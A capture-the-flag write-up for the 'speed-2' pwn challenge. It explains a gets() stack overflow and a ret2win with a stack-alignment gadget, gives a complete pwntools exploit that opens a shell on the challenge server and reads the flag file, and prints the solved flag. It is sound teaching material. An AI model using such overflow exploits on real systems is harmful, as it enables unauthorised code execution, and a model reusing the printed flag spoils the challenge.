# Midnight Sun CTF — speed-2 Writeup

**Category:** Pwn  
**Flag:** `midnight{e44a230e3fc7aadde716339cdea5d8cc}`

---

## Overview

speed-2 is a classic 64-bit buffer overflow challenge with a twist: the binary contains a pre-built win function that calls `system("/bin/sh")` directly, so no ROP chain is needed. The main challenge is correctly identifying that win function and handling stack alignment.

---

## Recon

### File & Protections

```
$ file speed2
speed2: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped

$ checksec speed2
Arch:    amd64-64-little
RELRO:   Partial RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     No PIE (0x400000)
SHSTK:   Enabled
IBT:     Enabled
```

Key observations:

- **No PIE** — binary loads at fixed address `0x400000`, so all addresses are static
- **No canary** — stack overflow has no cookie to bypass
- **NX enabled** — can't execute shellcode on the stack
- **Partial RELRO** — GOT is writable (not needed here, but good to note)

### Imports

```
$ nm -D speed2
U gets@GLIBC_2.2.5
U system@GLIBC_2.2.5
U puts@GLIBC_2.2.5
U printf@GLIBC_2.2.5
```

`gets()` and `system()` are both imported. Already looking promising.

### Strings

```
$ strings -t x speed2 | grep /bin
2008 /bin/sh
```

`/bin/sh` lives at `0x402008`. Combined with `system` in the PLT, this is everything needed for a shell.

---

## Vulnerability

The `main` function (at `0x401200`) is straightforward:

```asm
401208:  sub rsp, 0x20        ; allocate 32-byte buffer
40126b:  lea rax, [rbp-0x20]  ; buffer address
40126f:  mov rdi, rax
401277:  call gets@plt         ; !! unbounded read !!
401281:  leave
401282:  ret
```

`gets()` reads into a 32-byte buffer at `rbp-0x20` with no length check — a textbook stack buffer overflow.

**Offset to return address:** 32 bytes (buffer) + 8 bytes (saved RBP) = **40 bytes**

---

## Finding the Win Function

Rather than building a ROP chain, the binary already contains a function that does exactly what we want:

```asm
4011da:  endbr64
4011db:  push rbp
4011dc:  mov rbp, rsp
4011de:  mov edi, 0x402008    ; "/bin/sh"
4011e3:  call system@plt      ; system("/bin/sh")
4011e9:  pop rbp
4011ea:  ret
```

This function is never called by `main` — it just sits in the binary waiting to be jumped to. No need to manually set `RDI` or find a `pop rdi; ret` gadget (which doesn't exist in this binary anyway, due to IBT constraints).

---

## Stack Alignment

There's one subtlety. Modern libc's `system()` uses `movaps` internally, which requires the stack to be **16-byte aligned** at the point of the call. The x86-64 ABI guarantees this alignment when a function is _called_ normally — but when we _ret_ into a function instead of calling it, RSP is 8 bytes off from what the function expects.

Specifically:

|Scenario|RSP at win function entry|RSP when `call system` executes|Aligned?|
|---|---|---|---|
|Normal `call` to win|`16n - 8`|`16n - 24` → entry `% 16 == 8`|✓|
|`ret` into win (no fix)|`16n`|`16n - 16` → entry `% 16 == 0`|✗|
|`ret` into win (with extra `ret`)|`16n + 8`|`16n - 8` → entry `% 16 == 8`|✓|

**Fix:** prepend a bare `ret` gadget (`0x40101a`, found in `.init`) to shift RSP by 8 bytes before entering the win function.

---

## Exploit

```python
from pwn import *

WIN    = 0x4011da   # win function: mov edi, "/bin/sh"; call system
RET    = 0x40101a   # bare ret gadget in .init for stack alignment
OFFSET = 40         # 32-byte buffer + 8-byte saved RBP

p = remote('speed2.play.ctf.se', 6161)

payload  = b"A" * OFFSET
payload += p64(RET)   # align the stack
payload += p64(WIN)   # call system("/bin/sh")

p.sendlineafter(b"b0fz:", payload)
p.sendline(b"id; cat flag*; ls")
p.interactive()
```

---

## Result

```
$ python3 exploit.py
[+] Opening connection to speed2.play.ctf.se on port 6161: Done
[*] Switching to interactive mode
uid=999(ctf) gid=999(ctf) groups=999(ctf)
midnight{e44a230e3fc7aadde716339cdea5d8cc}
```

---

## Key Takeaways

1. **Always check for win functions first.** `objdump -d binary | grep -A5 "system"` immediately reveals if the hard work is already done for you.
    
2. **`pop rdi; ret` absence is a red herring** if a win function already loads the argument for you.
    
3. **Stack alignment matters.** When you `ret` into a function rather than `call`ing it, add a single `ret` gadget beforehand to restore 16-byte alignment for `system()`.
    
4. **IBT/SHSTK in ELF flags ≠ hardware enforcement.** The binary was compiled with CET annotations, but the exploitation path wasn't affected by them in practice.
